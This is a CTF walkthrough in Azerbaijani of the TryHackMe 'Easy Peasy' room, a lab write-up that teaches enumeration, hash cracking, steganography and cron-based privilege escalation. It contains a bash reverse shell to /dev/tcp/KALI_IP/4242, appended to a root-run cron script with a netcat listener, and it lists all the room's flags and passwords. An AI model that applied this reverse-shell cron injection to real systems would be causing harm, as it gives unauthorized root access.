# TryHackMe — Easy Peasy Writeup (Azərbaycanca)

> **Çətinlik:** Asan (Easy)  
> **Kateqoriya:** Enumeration, Hash Cracking, Steganography, Cron Privilege Escalation  
> **Link:** https://tryhackme.com/room/easypeasyctf

---

## Mündəricat

1. [Kəşfiyyat — Nmap Skanı](#kəşfiyyat)
2. [Flag 1 — Gobuster + Base62](#flag-1)
3. [Flag 2 — robots.txt + MD5](#flag-2)
4. [Flag 3 — Apache Səhifə Mənbəyi](#flag-3)
5. [Gizli Kataloq — Base62 Decode](#gizli-kataloq)
6. [Hash Crack — easypeasy.txt + John](#hash-crack)
7. [Steqanoqrafiya — stegseek + steghide](#steqanoqrafiya)
8. [SSH Girişi — User Flag](#ssh-girişi)
9. [Privilege Escalation — Cron + Root Flag](#privilege-escalation)
10. [Cavablar Xülasəsi](#cavablar-xülasəsi)

---

## Kəşfiyyat

Tam port skanı işlədirik (`-p-` bütün portları yoxlayır):

```bash
nmap -sC -sV -p- TARGET_IP
```

**Nəticə:**

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1
65524/tcp open  http    Apache httpd 2.4.43
```

**Tapıntılar:**
- `80` — Nginx 1.16.1
- `6498` — SSH (standart 22 deyil!)
- `65524` — Apache (ən yüksək port)

> 📝 **Tapşırıq cavabları:**
> - Açıq port sayı: `3`
> - Nginx versiyası: `1.16.1`
> - Ən yüksək portda işləyən: `Apache`

---

## Flag 1

### Gobuster ilə Kataloq Skanı

Port 80-də Gobuster işlədirik:

```bash
gobuster dir -u http://TARGET_IP/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan:** `/hidden`

`/hidden` qovluğunu skan edirik:

```bash
gobuster dir -u http://TARGET_IP/hidden \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan:** `/hidden/whatever`

`http://TARGET_IP/hidden/whatever` səhifəsinin mənbə kodunu açırıq (`Ctrl+U`):

```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

Bu **Base64** kodlaşdırmasıdır. Decode edirik:

```bash
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
```

> 🏁 **Flag 1:** `flag{f1rs7_fl4g}`

---

## Flag 2

Port **65524**-də Apache işləyir. `robots.txt` faylını yoxlayırıq:

```bash
curl http://TARGET_IP:65524/robots.txt
```

**Nəticə:**

```
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

`a18672860d0510e5ab6699730763b250` — bu **MD5** hashidir. [md5hashing.net](https://md5hashing.net) saytında decode edirik:

> 🏁 **Flag 2:** `flag{1m_s3c0nd_fl4g}`

---

## Flag 3

`http://TARGET_IP:65524` səhifəsinin mənbə kodunu açırıq. Birbaşa orada flag yazılıb:

```html
<!-- flag{9fdafbd64c47471a8f54cd3fc64cd312} -->
```

> 🏁 **Flag 3:** `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

---

## Gizli Kataloq

Eyni mənbə kodunda Base62 ilə kodlanmış gizli kataloq var:

```
ObsJmP173N2X6dOrAgEAL0Vu
```

[CyberChef](https://gchq.github.io/CyberChef) saytında **From Base62** ilə decode edirik:

```
/n0th1ng3ls3m4tt3r
```

`http://TARGET_IP:65524/n0th1ng3ls3m4tt3r` səhifəsini açırıq — ikili kod (binary) fon şəkli görünür. Mənbə kodunda hash tapırıq:

```
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```

Həmçinin yerli bir şəkil faylı: `binarycodepixabay.jpg`

---

## Hash Crack

TryHackMe-nin verdiyi **easypeasy.txt** wordlist-i ilə hash-i crack edirik.

Hash növü **GOST** (Rusiya hash standartı) olduğu üçün:

```bash
# Hash-i fayla yaz
echo "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81" > hash.txt

# John ilə crack et
john --format=gost hash.txt --wordlist=easypeasy.txt
```

**Nəticə:**

```
mypasswordforthatjob
```

> 🔑 **Tapılan şifrə:** `mypasswordforthatjob`

---

## Steqanoqrafiya

`binarycodepixabay.jpg` şəklini yükləyirik:

```bash
wget http://TARGET_IP:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
```

### stegseek ilə (Sürətli üsul)

```bash
stegseek binarycodepixabay.jpg easypeasy.txt
```

**Nəticə:** Şifrə və `secrettext.txt` faylı tapılır.

### steghide ilə (Manual üsul)

```bash
steghide extract -sf binarycodepixabay.jpg
# Şifrə: mypasswordforthatjob
```

Çıxarılan `secrettext.txt` faylını oxuyuruq:

```bash
cat secrettext.txt
```

**Nəticə:**

```
username: boring
password: 01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```

Şifrə **binary** formatındadır. CyberChef-də **From Binary** ilə decode edirik:

```
iconvertedmypasswordtobinary
```

> 🔑 **SSH məlumatları:**
> - İstifadəçi: `boring`
> - Şifrə: `iconvertedmypasswordtobinary`

---

## SSH Girişi

SSH portu standart **22** deyil, **6498**-dir:

```bash
ssh boring@TARGET_IP -p 6498
# Şifrə: iconvertedmypasswordtobinary
```

Daxil olduqdan sonra:

```bash
ls
cat user.txt
```

Faylın içindəki mətn **ROT13** ilə kodlanıb. CyberChef-də **ROT13** decode edirik:

> 🏁 **User Flag:** `flag{n0wits33msn0rm4l}`

---

## Privilege Escalation

### Crontab Yoxlaması

```bash
cat /etc/crontab
```

**Nəticə:**

```
* * * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

Hər dəqiqə **root** kimi `.mysecretcronjob.sh` işləyir!

### Fayl İcazəsini Yoxla

```bash
ls -la /var/www/.mysecretcronjob.sh
```

Yazma icazəmiz var! Reverse shell payload-ı əlavə edirik:

```bash
echo 'bash -i >& /dev/tcp/KALI_IP/4242 0>&1' >> /var/www/.mysecretcronjob.sh
```

### Dinləyici Aç

Kali-də:

```bash
nc -lvnp 4242
```

1 dəqiqə gözlə → **Root shell** gəlir!

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

ls -la /root/
cat /root/.root.txt
```

> 🏁 **Root Flag:** `flag{63a9f0ea7bb98050796b649e85481845}`

---

## Cavablar Xülasəsi

| Tapşırıq | Sual | Cavab |
|----------|------|-------|
| Nmap 1 | Açıq port sayı? | `3` |
| Nmap 2 | Nginx versiyası? | `1.16.1` |
| Nmap 3 | Ən yüksək portda nə işləyir? | `Apache` |
| Task 1 | Flag 1? | `flag{f1rs7_fl4g}` |
| Task 2 | Flag 2? | `flag{1m_s3c0nd_fl4g}` |
| Task 3 | Flag 3? | `flag{9fdafbd64c47471a8f54cd3fc64cd312}` |
| Task 4 | Gizli kataloq? | `/n0th1ng3ls3m4tt3r` |
| Task 5 | Hash şifrəsi? | `mypasswordforthatjob` |
| Task 6 | SSH şifrəsi? | `iconvertedmypasswordtobinary` |
| Task 7 | User flag? | `flag{n0wits33msn0rm4l}` |
| Task 8 | Root flag? | `flag{63a9f0ea7bb98050796b649e85481845}` |

---

## İstifadə Edilən Alətlər

| Alət | Məqsəd |
|------|--------|
| `nmap` | Port və servis skanı |
| `gobuster` | Gizli kataloq axtarışı |
| `CyberChef` | Base64, Base62, Binary, ROT13 decode |
| `md5hashing.net` | MD5 hash decode |
| `john` | GOST hash crack |
| `stegseek` | Steqanoqrafiya (sürətli) |
| `steghide` | Steqanoqrafiya (manual) |
| `ssh` | Uzaqdan giriş |
| `nc (netcat)` | Reverse shell dinləyici |

---

## Texniki Qeydlər

**SSH standart portda deyil** — `nmap -p-` (bütün portlar) işlətmək vacibdir, əks halda port 6498 tapılmır.

**Hash növləri bu CTF-də:**
- Base64 → `ZmxhZ3...`
- Base62 → `ObsJmP173N2X6dOrAgEAL0Vu`
- MD5 → `a18672860d0510e5ab6699730763b250`
- GOST → `940d71e8...`
- Binary → `01101001 01100011...`
- ROT13 → user.txt içindəki flag

---

*Writeup: TryHackMe Easy Peasy — Enumeration + Steganography + Cron PrivEsc*
